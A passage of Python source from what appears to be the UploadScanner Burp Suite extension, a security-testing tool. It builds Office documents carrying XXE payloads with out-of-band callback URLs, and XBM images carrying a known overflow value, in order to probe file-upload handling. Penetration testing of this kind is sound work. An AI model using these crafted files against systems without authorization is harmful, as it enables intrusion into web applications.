        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"""
        self._docx_content = self._docx_content.decode("base64").decode("zlib")

        self._xlsx_content = """
        eJztWWdUU9vWDR2kBkKvoXeQIr0jVSD0DgrSpBfpHekiEJCIVCnSQXoNvSO9SQcRBA29ioAP733fuF6e7/f78d2ZkZOdc8ZaGXt
        krr3nnguiioIKAqADMAEAABhgsZtha4YEACSgAgBEAExkYzlnJw8rJw9zHR8XK3dTbm9HB7ocVGTWbAAy4B/8v0Zp8pB6Fy/B/T
        OlS7lPXCqLVdKYgjuhfYTsmpLt3Um9xZbGmXZ2PzKjvxPIviF+IlRJOLrox3cwbFvl5FgXGtXbrIUTG9LfrmtGKcTT04dgaiMlh
        7oZGe5lgyil75Kbm8dZpwFeudZ3aQnIr8molFLYEpNIBq9nzPfpAVd6G3GKjQpF+hc6VtX1loHCg0WTBOvjRFNP7Nj8zI7WuZRR
        Y+n9Fkk8zfIhYANtNgutRrcLmGqrO2sD//RDS+Rl3ogEON7SyAp6c6sQjZoARVVRzHGxUW+CPUebv4m/bxvri9hjyEXTPWJbcy7
        jTOkQcOjEBwDEPraGpIzPaTSgW4o498HQfifd0nemNSKq7hXKx02Z8QmP1cnoHTlX8/sy5TVEhNhDAwv6BxqE2zV2LKn8nd6OY3
        xCvX/+A3QK3G46apclGGgHMwZE7qz2b4v5IcY2jMN2D1K2g/iu0QGAHz9QAJC/lWWtLi/D8c3owU3VYd+UpbmblYM7D/fP6z/l+
        A9+ohSqptHFixOxp3QZ2X82vZRAIKvqJaPUDNYJDFZexK+Ny2WkXGpjoSLQoQhDUQyCB14OLiyJx33pB59+FCiNJQSJMdR5lUXA
        LlyfYrAzu6UouJaudQM9p0+mT1MVVXxYPeHx7CUNhW9UB1YYFCYP5CsJRrn1KbCI8qkiSCRSQ4x61QyXLc7LkaZltXfKIt7VC2V
        /SRpNC5pNebuNKxUl8gAxkUrc725hM1fu3+8APvlGoattK2L3ziLTTZTex/yxQ/uRfFob0ZU/l3p6vxa9AOE536hiH1P2SZBRjc
        DBUIZPtxBWV0n//kBoLG3hMtLviiREMhl2dDNquqkFCgAmkrcDz5914uXsZm/h7Gz/c/f6v5pBuqkZpP/1f/a/RqmWmmo3LwEc+
        zqS1yvNkxg458FDj9D9io85UMO2wAzmDzxeoWRvMjWYUeVBcY7w2Rvu8zwTxPuIQnTSwVEYQ4jqS+SwJ4bmPHw0jIJpsVNGE6qI
        RkSI+PK1ZAcb77U7UaMktJ8zEyS8ec7KRB6Z+5Ze/rhxIkLgyQjvU74n7mPUgzecGar5FHzxTBtRFlpTX0/3ms1640ej3MIpela
        oD+34ETmWsjiuD2B8awrMcd5x/xTzsOXSWs1nxL4j9wJng6pElaZYUMI/woMusl+RNogN6r6Rk9qsu7fmIft9kK1t4ZBz6HjP+t
        NA3/QK4HeUSZyeDlK7oUvNjdzBv7lzQ5lfyVKqo+q8wIvTiv8hiNfD68o2UyE9Jx7EwYtzH1ZHam6b+iK8H8oyoBrz6EdAjanzk
        u/2O1NOlRwp6Irik6eepflnxHHERvmcolipkTFfZQtNB3frZ69DfWZC2KWfhLP5yQ6NzOytlOHNI9zLzmiQWNOqBhuZsZCHOEo7
        MrfQiZeS56dWbe09QxxxZB9xyOsP0eF1GULCIA7SSu+NeT0M77zQf10vyC4UTJa8yhpgHN37wlYwCNsE13rlnuTsUzmCxoROiZP
        s9yU+btXa89LcRQhLAerEAX80U2ynmul8MXDhQ6VDXbgmmfw45NBX9040PsoOjcAwS2EzK9SHsHQB1PkosUrE8QQpSIzX0X38jn
        L9uL9kWuXDK+0Y43ViA1mOpRR5srUB13vGvZMjSTGiMLw45EiYkcjH/dSroI2SvtZSgaL1pTWYHlne2y1b44otbPGQxeXQkpaZ/
        mRTljlqI9SuEk7fbvEh48nzOAcv2TlEayJFzChVsmySCD0dpfBJrM2G46ksnnfZiTkmcoslM92TiGOM7xqvZ0rK52hRaRA8nc1l
        Xv6g4rHI5PEtcfg7/KuDXFaTl1XelZjbgcLfgy30RSaYnjM/or1E85SiBeWaS0yf9ZC4JRMyUPQ4+TqJHqTaEMpENLLl0FheJoZ
        9msJamhAb+WjlMe+zOh5QU26ujJpY5Qy69qfhZglsEMm4SOrhOyVNmvzQlm7Sk7bt717b+CrwR1uABjzhuYYizAqt1xF3X0JC2M
        vALDhfhOxOjr9y7N2vDy/tr1B+x7zs6HvdqTejyps36E/muds+crN6rO3hZudk4/6TfgLDMnc6eQnC1+Cr1J2IHR1Semhe1CrWM
        eANtWN26tR7nePT3vCh+L71+iUxtc379y2sMRbeosktfgYfdnXs+M5RtUeh03Qmp1L5K2UffX1JrKndxomnMP0tivVKiU0pyeZj
        06K7sgzHEIoVNwidPFpArcF+QeItAfmDLNKZebRqF39uj+sF4+jlYilDHecDjFLlH2i/m4oBhtC2OgYA0E7388zwx1Q8bK0crf6
        83v05E4ThcCylEKiN9EIKx93rUnA9nml5ddQhaYnxcUYyVW0dQlOPnw/aQkmEzCRyosWalw+TdZZInpBGwYUfx2Mx1mzTjrMMf2
        Ao22BMc1Ax8sSNVbyGFxScZQb6HnkcTMBf+Sq+wu6Eppi3Qg4l0p9/eMU4mRJkL8wq4K+hlPwcaIXl9A2b81J1ISvQDeg4gNn3A
        eWbvMObFFplkQV2kh7MiMSGdmvhkBXm531KnQxZJH1U1GHLr0g48rXKyBig52ahFhC/AD4wA8KZZ/qUbUs9D4LCMHj2UqvlBTVt
        CrEspzzMbQ9zPAWf//ncAcFKUqtiYsK+3BDPtlRbQ0BlVB0fmF2on8IN5Qo2YIW83hWTmaSBr5eELkM2Nc9xRSG9IVpuvjd7Uft
        SElc6F1gqUNszY1jhEYZjHzxRgbcE960wqtuPuP7yengHEsDZgp5/ESZ4+XAMjcfIG1flYI1CEiEgJmHchp5/Pk/RavbkLLQp3z
        yMXgXaJejBVqrbPDRdTkek4JW+b02G8+XlA58XoQ4GVrDXFp2EjWyzFh6wAyQAKIFemVCD29o7VCGhzVR+AIllmTtVIcGbP5kXq
        StfxQ5S3Bl0gnUsRK1ZE54ILkMgq3bPJ1T1ETGoW1dtmCOVtSL5HCDmjiI1sqQud77lKo7SXkOHy3QN3cRYU1+7VQReXuztte1f
        X5xE6se3KRdIRpMyX2+MmrdeXsXPFkUSfy73PthJgmlktZzvlkgF+SLGlje32p/hKz8P98Kl9RMyxMH2+BCPf77NGAGkT0GNka6
        Xe2quQLI/j6xJWh7mSLq82c7HvbrxzXRo5ipqlMn1vb9gDNcqjWVNV8Mkkv60SURk5NHjL5npo2qLas9emLh7aVqgNUhlIcEJYY
        NOz7j4nSHJSgI9WCmZF3HUFgiDJWpZzrbdRKBNqFqeV6Q3tXw6NzkUhSPR7Q01oZwJCTcKeCrF+dTJj1rBtGR3jYESawFZM/JA7
        gGXkJmCe7QFbBAcU7S9b8rIAEv8ji3J5xoABk9oP0idpbUEm/DNipTOYl7oPiTz+nC2RV+XaAKVg42Ydr+KRlR2OT37mDppDZVn
        PuV3xWSLaaF80LTq934Z/IX8YzA0bq1V7R3xrhBRBxed/mSeuMwUj/tu1IbVe8RVQzbRM1POyc3KnnJH9fS58VSNsqnlnlc5lgK
        9H5pPUrtC8dIMJUfjWgmRShAP9S1MZTzLiz+jYiO2m6wz6L2i32l50mrMofudkrBE2YRAyQ7UXlfITJVNhWuPKOfPbm+NoZoxQM
        5lWoUz3EyD8Rgav6fVLEclPPUsslkbmUWr/3h2zw/ndGNpclc1oaMgBckiyH4FB1jL3E9kHZXd7jLOFWWwNnp/qrG4Z1O9MRpud
        8Qr/ejxtNhd5WWDy3RWv86gAoQrKa8NZL+BuE2jqDpay1MdJJzm8qOj6m3k5gAuDsuAqE2GvuBn3bgfbRVP7u1sHBlttqSIVFiZ
        OJvT5qUMDJEWOhxyx+9+66Y0liSS3W41gbRweMwqtlMOewPCmqjz/aAlJKucoRWGYQOdaiITfDQ2h+70uVeYw9mCOjPDI0X9Ohr
        hQpbIogq+BkKaB1hLTXsC8WcfhHc8UoaKS1KbIHSp8bDOaWGPoscx5dNHu0sq8N1I9aewp3bBUIk4YO/jOqBuJPBkg05+7anC1s
        uMaGK1SGLc/EDyYiuQfjlgUk8zRN8J32zKOJAsj/qxba+Mj6Seq0rawNBW8Wq6XZ6QSNJrcgDTKR/KoZLQyzJKWIEe7O28sfw8X
        6eS0AImAy6DN3CkatKhMcuqNM1HiesomSOlGSyUu3xOUKnH6BZKaWvBh6bWsp5iXhLhksUnW50iFfLirn+cTYKYLPwpWDQcG5b4
        aTsiiNQ61RXspyRf1CW4nedAQBTdqKi8eDh9qD8nTTQMnq9zQ8NcyxUsx6o5rCTHkKkPe85CJA61/hAH3Ng+BpJJbtz5XGF0udS
        hAh0GL34fP/8glu0eSCQTE35S5bb6CrNBmLVgmYqoAcsYaJgZxIL39rnncAlrhty2cE41phVLjPImm0nS1iDVVc1hyEFyGTlV02
        5nWJHow5XvUwFHmmXiNgnWgdZGpTnqakKpgQ1yy+/YpeS5SrS+zOxN0X9u2oR+pdPMKOimVF+qFybAmTwc4JxM7vkqUCosRlmrJ
        tYV2r4v7xi2omfzbJJoz/cwbHGgVBeju6p8KrqCZ2jY2NHThbQ/F+Ms0p09HI9p0dAd9b65L0rqBLpDoh9fCXAtTehz3sYKT/hO
        tjFWc7gWA4I09AmEXaDTs3YMr+tJI22KKlx9A4mKky9m6JGvplQwB05Tf/nXk/P5lwEtLfmNvBauidsc33LumZjPwThecPg5Fzp
        tBsQDthcrdNGHn1RrcwiU7MiAt55ShFvXz7AdP1nydR77GhG3uRqyR23nMlbuGWbUpln4snlJFsLBdkQ5LCtRqDMvA1/awtjBMC
        RH4dDYZjhCa9BfqL3C/62GDeg98IfdaFh0dAAA999KwsPHweoPCZGnY2y/wAsKpEVIYcKbq5aEVUN3qgQEQffI8sLg7HXpUV8sG
        PPd752ueH1STZ+ojDvtEf18viW20sgGt8uX1nhvUK4bkVtCwPBWxdS1dnR/NpLe4OFjal1iYqNKnKxXPULfvnsVPWXpqMPopULG
        tOL3dyk3BFoMoSRNmW1HsJ1r2zMUoUwjoh1xcl+ewPLoXMlGovNM1mgeMQ39QEqcEqdJy56qevNir2F1d+rRI8ah6SszOzkv5MK
        68ecphXGbzDQMHm9JZRh54uqaPPUBKh6mR1D4pyZGVdkhLKyH5pEgJsbn37uPamYGDXW+5LpBAqXP8vTjVYL0w39sxMH1M+dpt6
        LvvJN/9cmuKPxev0wleHYkp/AxvI+L2N+mwauk6NPHqTRL560L/nNlvOlDhY8+OJHhqiZR/CUfiABymbId1PzFADTcw66ikP071
        rmR25fXa3ChY1DPQA/aBNr7yYx7xO8/6sSPJxeETuNFUbRKnU9uo7eK7VDVcGpwqJ8Zaa5pb8uMIOdp84HrAs3apkffLVAU5XLm
        NVfw4STtxfLGJPTTnXrDPx7wjPsihLpy6gJf4EeR1mQlSkYqtq6QL3su2LG/ykBC3XlhIlx+LU0OKfFkl93yW71s8tgQ6Qsx0il
        9q7hGMyLFLz6QZdgTTzjzZP+iM6vmKx3fzQ3/ipzG+A6js4HO4I7oFxE255+XLrrc3PW7O+hNeELnBFVDraqWUQcQnvA50BAvnn
        OQKWKHsq7Oz/IQpGdvhYaoI4dS9zuzUOq4a/leLCUj76juDnnTBD7I4WUt72J9NbxNb/C+IilbKcebP6tsD0rfuJrZcpiBqQyK2
        5OnZOLoYyIyiYNTiHnYhTOHXMAY+z9g8UmsfnP+LYNJ7CQoS28O4/g3Spnsr1OYu62VlYc7zx8ff6jI51Dzn2TuWcH4jie7V4vg
        tqOwbE4Or5LE6b0+MUypcAQqzyqpTPh/N53Lw6mSwUU3VT7rE/lc7OtdG0HdgRFXvnk/xR1d/VHBEuTIXCrLaVcEW7NJncIDcsS
        Pej3mfwnJGNvrwiQgB5oUfiNb17kDnMLUi8BhcfGYyK3n09rGADLjV6WllQLrfQJZSqde8DybaIsMCaggRkCoORsapMXJyJWDyE
        5A3AIly2HVE3v4k3GyYsCcaYW+I5yN98WHPi5bVvb9Z/aV0C+dmbEcLdODlu2S1s+IYsfsR40rieWfFKsnhYHEjsZmLytXc4o2X
        QLthcPbZjgHTzHIIEDR10Abtu8krlnckpN6mUY9unuT6VdCo0bkq/yvSZd6EgEC63i+PrwHYpmtwTS9Ss32brAHKUs+GDKaTagj
        TrPOVZ58g28PvS0E2LSAzKmbZsk111422kUesNK7oWh8AQ6HKlTKpTlZENI5bD8oiv/LwDFuXpQrzoddqeagTfIyBnXlmc3A6sH
        YE+ta01axEaPnwJ0gPEVfb2mtQwSRjYRFC4itob5g8fK31oxwSZ+u5M0Tw5t1CgjARHrsbAlxc3Zx57F0drP6d1PhH0fmBs+hwz
        9N9Wd7Si1yn/w+Ct/nqoXqIE8RvUxgRXatRjjaA8VSdqCnO66BmDIb7eNi1Ssj5ekV6sUxkh2ihl+RExnvA23NsIvO0HznyteNQ
        SKjNQ91y95I27jY6pqZbyxCzIy9q2qRvjI1sCbU5C6Ctlbhb8jEAgE9JoRUolHN8+ybXZO7lY8uw3aQbOxE++6IE73nX0S25Ccc
        Dwb5y7/OLRMNXiVjh2TDuxjB531fO9jPbOQKHqSrXFRjieG6Fjh0+Ll6ZKVTxalNMg6XxgIPiS7rfPx39eLynZx7kF42riYbP2y
        t2xgPGT7IG6OpsBhx7szwIuxe8tk3mUEpiF3qkpYHY+5YBnFUVH+P3KF4aahC4ioaW72RsjjmoF694Sd2qh9EWcpT+Oj8RzS2Sv
        +zc1xWd/8D8kEewO9Ix9tLsptxwyjem2WF4FfSPXJx+YdzfyE9qcNp4adzjHKKF7Ebl+7JGiGtp5lH7WtQCXD1s3ksCmRWjeimU
        M6yca4ipXTMjZ48raEcyLr+Fg2dHm51NYy8O7eKfTdrg17OWdbqqo5AYyM+do9eFbUVmVSc5GOw8uJWhfkUewQJg+EDcuNznShq
        zeYEvlTqewnWnH56Xwgo6dTX9SKa6tD3Qn3sxpJa3h/ZR/vJmj96Ok6D27PVsLUVpFby0Lf12ITGCH2mGAe1vAb3i8mAdo7Twow
        hSnfBbPxMd4Ks2tzVcra2Gzv7W7Ncn+gUPHifgK49Ch5MHDK7Ssjuw16I8SwwlePdXbvp8Rw5ObD1QOuhKM/9upBnEtZg0SgS8b
        tOK/eY5RDz8porvbhGKpRnZ/hABaZGe50Il4sOgbqVY3/b1dWWSiEyOwPhz5xcIg/avhDLX6D6SfbQkClsAQue4YpGrk+xrbm4Z
        Z6MBJC/JrkMCbc8nrxY2S7i6qImaHU8aSmcEYsyOLhPVR/IWYhhZusBH3DDCIydNh5VfBOEMrqOn/15tvqS/fPXjKlkcYmnP8Xe
        n5RGQuYC/LcG7W38pl17O8HfW0m/AnZTJ780lm4H/t1e/xUt6H/s2f/FbL+d57bn+hf2MP/Dgb0dfNs2+wt22L830W5nuO1W/QU
        BnN96V7cT3Nbbf6Ga6Jb6vh16W+j8hack/1323M7y9830V+jfJP2PrfV2+N+XxV/xnuKX8H8vkhBVNPSfz+7cvIJvfjCL+ue3fw
        FIpCyC"""
        self._xlsx_content = self._xlsx_content.decode("base64").decode("zlib")

        self._xmltag = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        self._xmltag_standalone_no = '<?xml version="1.0" encoding="UTF-8" standalone="no"?>'
        self._creator = '<dc:creator>user</dc:creator>'
        self._creator_tagname = "dc:creator"

    def _create_docx(self, markers, filenames=None):
        return self._create_office_document_xxe(markers, self._docx_content, filenames=filenames)

    def _create_xlsx(self, markers, filenames=None):
        return self._create_office_document_xxe(markers, self._xlsx_content, filenames=filenames)

    def _create_office_document_xxe(self, markers, content, filenames=None):
        zipincontent = BytesIO(content)
        zipoutcontent = BytesIO()
        zin = zipfile.ZipFile(zipincontent, "r")
        zout = zipfile.ZipFile(zipoutcontent, 'w')
        for item in zin.infolist():
            orig_content = zin.read(item.filename)
            file_content = orig_content
            if not filenames or item.filename in filenames:
                for marker, replace_str in markers:
                    if marker in file_content:
                        # print("found", marker, "replacing with", replace_str)
                        file_content = file_content.replace(marker, replace_str)
                    else:
                        # if not all markers are in there, use the original content
                        file_content = orig_content
                        break
            # Attention: These office documents have the placeholder, not a real Burp Collaborator URL yet
            zout.writestr(item, file_content)
        zout.close()
        zin.close()
        zipoutcontent.seek(0)
        c = zipoutcontent.read()
        zipincontent.close()
        zipoutcontent.close()
        return c

    def _inject_burp_url(self, content, burp_url):
        zipincontent = BytesIO(content)
        zipoutcontent = BytesIO()
        zin = zipfile.ZipFile(zipincontent, "r")
        zout = zipfile.ZipFile(zipoutcontent, 'w')
        for item in zin.infolist():
            orig_content = zin.read(item.filename)
            file_content = orig_content.replace(Constants.MARKER_COLLAB_URL, burp_url)
            zout.writestr(item, file_content)
        zout.close()
        zin.close()
        zipoutcontent.seek(0)
        c = zipoutcontent.read()
        zipincontent.close()
        zipoutcontent.close()
        return c

    def get_files(self, formats=None):
        # The formats parameter specifies the formats the *module* wants to send
        # The self._enabled_formats specifies the user enabled in the UI
        # Make sure we only take the intersection between what the module wants and what is enabled in the UI
        if formats:
            formats = set(formats) & set(self._enabled_formats)
        else:
            formats = self._enabled_formats
        for filenames_desc, filenames in [
            # TODO feature: I really don't know into which files we should inject... this is just a wild guess
            ("All", None),  # As the .rels files is parsed first, mostly this will work when .rels parser is vulnerable
            ("ContentTypes", ["[Content_Types.xml]", ]),
            ("Main", ["word/document.xml", "xl/workbook.xml"])  # "ppt/presentation.xml"
        ]:
            techniques = Xxe.get_root_tag_techniques(self._xmltag, self._xmltag_standalone_no)
            for name in techniques:
                if ".docx" in formats:
                    yield techniques[name][-1][-1], name + filenames_desc, ".docx", self._create_docx(techniques[name],
                                                                                                      filenames=filenames)
                if ".xlsx" in formats:
                    yield techniques[name][-1][-1], name + filenames_desc, ".xlsx", self._create_xlsx(techniques[name],
                                                                                                      filenames=filenames)

        # TODO feature: For now we only do the following injections for docProps/core.xml which includes the dc:creator tag.
        # Is there a point to do it in other XML tags in other XMLs too? Which ones?
        filenames_desc = "Core"
        filenames = ["docProps/core.xml"]
        techniques = Xxe.get_tag_techniques(self._xmltag, self._xmltag_standalone_no, self._creator,
                                            self._creator_tagname)
        for name in techniques:
            if ".docx" in formats:
                yield techniques[name][-1][-1], name + filenames_desc, ".docx", self._create_docx(techniques[name],
                                                                                                  filenames=filenames)
            if ".xlsx" in formats:
                yield techniques[name][-1][-1], name + filenames_desc, ".xlsx", self._create_xlsx(techniques[name],
                                                                                                  filenames=filenames)

class Xbm(object):

    def __init__(self, name):
        self.name = name

    def create_xbm(self, width, height, bytes_per_line=12):
        xbm = "#define {}_width {}\n".format(self.name, width)
        xbm += "#define {}_height {}\n".format(self.name, height)
        xbm += "static char {}_bits[] = {{\n".format(self.name)
        no_of_bytes = (width * height) / 8
        xbm += "  0x80000001, " #  the value causing the overflow, from orig PoC
        #xbm += "  0xffffffff, "
        first_line = "0x00, " * (bytes_per_line - 1)
        xbm += first_line + "\n"
        no_of_bytes -= bytes_per_line
        while no_of_bytes > 0:
            bytes_this_line = min(bytes_per_line, no_of_bytes)
            line = "0x00, " * bytes_this_line
            xbm += "  " + line + "\n"
            no_of_bytes -= bytes_this_line
        xbm += "};\n"
        return xbm
# end modules

class ColabTest(object):
    def __init__(self, colab_url, urr, issue=None):
        self.colab_url = colab_url
        self.urr = urr
        self.issue = issue

class ActionFunction(ActionListener):
    def __init__(self, func):
        self.func = func
    def actionPerformed(self, actionEvent):
        self.func(actionEvent)

class RunnableFunction(Thread):
    def __init__(self, func):
        self.func = func
    def run(self):
        self.func()

class ScanMessageEditorController(IMessageEditorController):
    def __init__(self, scan_controler, msg_type):
        self.sc = scan_controler
        self.methods = {
            "upload" : [self.getUploadHttpService, self.getUploadRequest, self.getUploadResponse],
            "preflight" : [self.getPreflightHttpService, self.getPreflightRequest, self.getPreflightResponse],
            "redownload" : [self.getRedownloadHttpService, self.getRedownloadRequest, self.getRedownloadResponse]
        }
        self.methods = self.methods[msg_type]

    def getHttpService(self):
        return self.methods[0]()

    def getRequest(self):
        return self.methods[1]()

    def getResponse(self):
        return self.methods[2]()

    def getUploadHttpService(self):
        return self.sc.upload_req_service

    def getUploadRequest(self):
        return self.sc.upload_req_view.getMessage()

    def getUploadResponse(self):
        return self.sc.upload_resp_view.getMessage()

    def getPreflightHttpService(self):
        return self.sc.preflight_req_service

    def getPreflightRequest(self):
        return self.sc.preflight_req_view.getMessage()

    def getPreflightResponse(self):
        return self.sc.preflight_resp_view.getMessage()

    def getRedownloadHttpService(self):
        return self.sc.redownload_req_service

    def getRedownloadRequest(self):
        return self.sc.redownload_req_view.getMessage()

    def getRedownloadResponse(self):
        return self.sc.redownload_resp_view.getMessage()

class MenuItemAction(AbstractAction):

    def __init__(self, invocation, extension_object):
        self.invocation = invocation
        self.extension_object = extension_object

    def actionPerformed(self, e):
        self.extension_object.new_request_response(self.invocation)

class CloseableTab(JPanel, ActionListener):
    def __init__(self, title, pyparent, content, customize_callback, close_callback, index):
        super(JPanel, self).__init__()
        self.setOpaque(False)
        self.title = title
        self.pyparent = pyparent
        self.close_callback = close_callback
        self.index = index
        self.pyparent.add(title, content)
        index = pyparent.indexOfTab(title)
        self.lbl_title = JLabel(title)
        self.lbl_title.setBorder(BorderFactory.createEmptyBorder(0, 0, 0, 15))
        customize_callback(self.lbl_title)
        self.btn_close = JButton("x")
        self.btn_close.setPreferredSize(Dimension(18, 18)) #35, 10
        self.btn_close.setBorderPainted(False)
        self.btn_close.setBorder(BorderFactory.createEmptyBorder(0, 0, 0, 0))
        self.btn_close.setFocusPainted(False)
        self.btn_close.setContentAreaFilled(False)
        self.btn_close.setOpaque(False)
        self.btn_close.setMargin(Insets(0, 0, 0, 0))
        customize_callback(self.btn_close)
        self.gbc = GridBagConstraints()
        self.gbc.insets = Insets(0, 0, 0, 0)
        self.gbc.gridx = 0
        self.gbc.gridy = 0
        self.gbc.weightx = 0
        self.gbc.weighty = 0
        self.add(self.lbl_title, self.gbc)
        self.gbc.gridx += 1
        self.gbc.weightx = 0
        self.add(self.btn_close, self.gbc)
        self.btn_close.addActionListener(self)
        self.pyparent.setTabComponentAt(index, self)
        customize_callback(self.pyparent)
        # This is no the most sensible UI choice to put the focus there, but better than not:
        # Select the new "1 x" tab:
        self.pyparent.setSelectedIndex(index)
        # Then select the "Upload Scanner" tab
        i = self.pyparent.getParent().indexOfTab("Upload Scanner")
        self.pyparent.getParent().setSelectedIndex(i)

    def actionPerformed(self, evt):
        if self.close_callback(self.index):
            self.pyparent.removeTabAt(self.pyparent.indexOfTab(self.title))
            self.pyparent = None
            self.close_callback = None

class Readme:
    @staticmethod
    def get_readme():
        about = """<html>Author: Tobias "floyd" Ospelt, @floyd_ch, https://www.floyd.ch<br>
modzero AG, @mod0, https://www.modzero.ch<br>
<br>
A Burp Suite Pro extension to do security tests for HTTP file uploads.<br>
For more information see https://github.com/modzero/mod0BurpUploadScanner/
</html>
"""
        return about
